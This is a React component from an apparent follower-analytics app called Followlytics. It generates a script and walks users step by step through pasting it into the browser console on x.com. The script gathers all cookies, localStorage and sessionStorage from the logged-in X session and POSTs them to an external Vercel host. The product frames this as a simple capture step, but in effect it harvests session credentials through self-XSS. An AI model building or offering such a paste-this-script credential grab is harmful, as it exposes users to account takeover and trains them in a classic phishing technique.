'use client'

import { useState, useEffect } from 'react'
import { useAuth } from '@/hooks/useAuth'

export default function XSessionCaptureManual() {
  const { user } = useAuth()
  const [sessionStatus, setSessionStatus] = useState<'none' | 'captured' | 'expired'>('none')
  const [loading, setLoading] = useState(true)
  const [showInstructions, setShowInstructions] = useState(false)

  useEffect(() => {
    checkSessionStatus()
  }, [user])

  const checkSessionStatus = async () => {
    if (!user) return

    try {
      const token = await user.getIdToken()
      const response = await fetch('/api/auth/x-session-status', {
        headers: {
          'Authorization': `Bearer ${token}`,
        },
      })

      if (response.ok) {
        const data = await response.json()
        setSessionStatus(data.hasValidSession ? 'captured' : 'none')
      }
    } catch (error) {
      console.error('Error checking session status:', error)
    } finally {
      setLoading(false)
    }
  }

  const generateCaptureScript = () => {
    if (!user) return ''
    
    return `
// Followlytics X Session Capturer
(function() {
  console.log('🔐 Followlytics session capture started...');
  
  // Check if we're on X.com
  if (!window.location.hostname.includes('x.com') && !window.location.hostname.includes('X.com')) {
    alert('❌ Please run this script on x.com or X.com');
    return;
  }
  
  // Extract session data
  const cookies = {};
  document.cookie.split(';').forEach(cookie => {
    const [name, value] = cookie.trim().split('=');
    if (name && value) cookies[name] = value;
  });
  
  const localStorage = {};
  try {
    for (let i = 0; i < window.localStorage.length; i++) {
      const key = window.localStorage.key(i);
      if (key) localStorage[key] = window.localStorage.getItem(key);
    }
  } catch (e) {
    console.log('localStorage access failed:', e);
  }
  
  const sessionStorage = {};
  try {
    for (let i = 0; i < window.sessionStorage.length; i++) {
      const key = window.sessionStorage.key(i);
      if (key) sessionStorage[key] = window.sessionStorage.getItem(key);
    }
  } catch (e) {
    console.log('sessionStorage access failed:', e);
  }
  
  const sessionData = {
    cookies,
    localStorage,
    sessionStorage,
    userAgent: navigator.userAgent,
    url: window.location.href,
    timestamp: new Date().toISOString()
  };
  
  console.log('📊 Session data extracted:', {
    cookieCount: Object.keys(cookies).length,
    localStorageCount: Object.keys(localStorage).length,
    sessionStorageCount: Object.keys(sessionStorage).length
  });
  
  if (Object.keys(cookies).length === 0) {
    alert('⚠️ No cookies found. Make sure you are logged into X.com!');
    return;
  }
  
  // Send to Followlytics
  fetch('https://followlytics-zeta.vercel.app/api/auth/capture-x-session-direct', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ sessionData, userId: '${user.uid}' })
  })
  .then(response => response.json())
  .then(data => {
    if (data.success) {
      alert('✅ X session captured successfully!\\n\\nReturn to Followlytics dashboard to start your follower scan.');
      console.log('✅ Session capture successful!');
    } else {
      alert('❌ Capture failed: ' + (data.error || 'Unknown error'));
      console.error('❌ Capture failed:', data.error);
    }
  })
  .catch(error => {
    alert('❌ Network error: ' + error.message);
    console.error('❌ Network error:', error);
  });
})();
    `.trim()
  }

  const copyScript = async () => {
    const script = generateCaptureScript()
    try {
      await navigator.clipboard.writeText(script)
      alert('📋 Script copied to clipboard!\n\n1. Go to X.com and login\n2. Press F12 to open developer tools\n3. Go to Console tab\n4. Paste the script and press Enter\n5. Return to Followlytics when done')
    } catch (error) {
      // Fallback - show in new window
      const popup = window.open('', '_blank', 'width=600,height=500')
      if (popup) {
        popup.document.write(`
          <html>
            <head><title>X Session Capture Script</title></head>
            <body style="font-family: Arial; padding: 20px;">
              <h2>📋 X Session Capture Script</h2>
              <p><strong>Instructions:</strong></p>
              <ol>
                <li>Select all the code below (Ctrl+A)</li>
                <li>Copy it (Ctrl+C)</li>
                <li>Go to X.com and login</li>
                <li>Press F12 to open developer tools</li>
                <li>Go to Console tab</li>
                <li>Paste the script and press Enter</li>
              </ol>
              <textarea style="width: 100%; height: 300px; font-family: monospace; font-size: 12px;" readonly onclick="this.select()">${script}</textarea>
            </body>
          </html>
        `)
      }
    }
  }

  const startCapture = () => {
    setShowInstructions(true)
  }

  const triggerAutoScan = () => {
    // Trigger the follower scanner after successful capture
    const scanEvent = new CustomEvent('startFollowerScan', {
      detail: { hasSessionData: true }
    })
    window.dispatchEvent(scanEvent)
  }

  if (loading) {
    return (
      <div className="p-4 bg-gray-50 border border-gray-200 rounded-lg">
        <div className="flex items-center">
          <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-blue-600"></div>
          <span className="ml-2 text-sm text-gray-600">Checking X session status...</span>
        </div>
      </div>
    )
  }

  if (sessionStatus === 'captured') {
    return (
      <div className="p-4 bg-green-50 border border-green-200 rounded-lg">
        <div className="flex items-center justify-between">
          <div className="flex items-center">
            <div className="flex-shrink-0">
              <svg className="h-5 w-5 text-green-400" viewBox="0 0 20 20" fill="currentColor">
                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
              </svg>
            </div>
            <div className="ml-3">
              <h3 className="text-sm font-medium text-green-800">
                ✅ X Session Active
              </h3>
              <p className="text-sm text-green-700">
                Your X authentication is captured and ready for follower scanning.
              </p>
            </div>
          </div>
          <div className="flex space-x-2">
            <button
              onClick={triggerAutoScan}
              className="bg-green-600 hover:bg-green-700 text-white text-sm px-3 py-1 rounded"
            >
              🚀 Start Scan
            </button>
            <button
              onClick={checkSessionStatus}
              className="text-green-600 hover:text-green-700 text-sm"
            >
              🔄 Refresh
            </button>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="p-4 bg-blue-50 border border-blue-200 rounded-lg">
      <div className="flex items-center justify-between">
        <div>
          <h3 className="text-sm font-medium text-blue-800">
            🔐 X Session Required
          </h3>
          <p className="text-sm text-blue-700 mt-1">
            Simple 3-step process to capture your X session. No popups, no CSP issues!
          </p>
        </div>
        <button
          onClick={startCapture}
          className="bg-blue-600 hover:bg-blue-700 text-white text-sm px-4 py-2 rounded"
        >
          📋 Get Script
        </button>
      </div>
      
      {showInstructions && (
        <div className="mt-4 p-4 bg-white border border-blue-200 rounded">
          <h4 className="text-sm font-medium text-blue-800 mb-3">
            📋 Simple 3-Step Process
          </h4>
          
          <div className="space-y-4">
            <div className="flex items-start space-x-3">
              <div className="flex-shrink-0 w-6 h-6 bg-blue-100 rounded-full flex items-center justify-center text-xs font-medium text-blue-600">1</div>
              <div className="flex-1">
                <p className="text-sm text-gray-700 mb-2">
                  <strong>Copy the capture script:</strong>
                </p>
                <button
                  onClick={copyScript}
                  className="bg-green-600 hover:bg-green-700 text-white text-sm px-4 py-2 rounded"
                >
                  📋 Copy Script
                </button>
                <p className="text-xs text-gray-500 mt-1">
                  Script will be copied to clipboard with instructions
                </p>
              </div>
            </div>
            
            <div className="flex items-start space-x-3">
              <div className="flex-shrink-0 w-6 h-6 bg-blue-100 rounded-full flex items-center justify-center text-xs font-medium text-blue-600">2</div>
              <div className="flex-1">
                <p className="text-sm text-gray-700 mb-2">
                  <strong>Run script on X.com:</strong>
                </p>
                <ol className="text-sm text-gray-600 space-y-1 list-decimal list-inside">
                  <li>Go to <a href="https://x.com" target="_blank" className="text-blue-600 hover:underline">x.com</a> and login</li>
                  <li>Press <kbd className="bg-gray-100 px-1 rounded">F12</kbd> to open developer tools</li>
                  <li>Click <strong>Console</strong> tab</li>
                  <li>Paste script and press <kbd className="bg-gray-100 px-1 rounded">Enter</kbd></li>
                </ol>
              </div>
            </div>
            
            <div className="flex items-start space-x-3">
              <div className="flex-shrink-0 w-6 h-6 bg-blue-100 rounded-full flex items-center justify-center text-xs font-medium text-blue-600">3</div>
              <div className="flex-1">
                <p className="text-sm text-gray-700 mb-2">
                  <strong>Return here:</strong>
                </p>
                <p className="text-sm text-gray-600">
                  You'll see "✅ Session captured!" message. Come back to this dashboard and start your scan!
                </p>
              </div>
            </div>
          </div>
          
          <div className="mt-4 p-3 bg-green-50 border border-green-200 rounded">
            <p className="text-sm text-green-800">
              <strong>✅ Why this works better:</strong>
            </p>
            <ul className="text-sm text-green-700 mt-1 space-y-1">
              <li>• No popup windows or CSP issues</li>
              <li>• Works in any browser</li>
              <li>• Simple copy-paste process</li>
              <li>• Reliable session capture</li>
              <li>• Clear step-by-step instructions</li>
            </ul>
          </div>
          
          <div className="mt-4 flex justify-between items-center">
            <button
              onClick={checkSessionStatus}
              className="text-blue-600 hover:text-blue-700 text-sm"
            >
              🔄 Check if captured
            </button>
            <button
              onClick={() => setShowInstructions(false)}
              className="text-gray-500 hover:text-gray-700 text-sm"
            >
              Hide instructions
            </button>
          </div>
        </div>
      )}
    </div>
  )
}


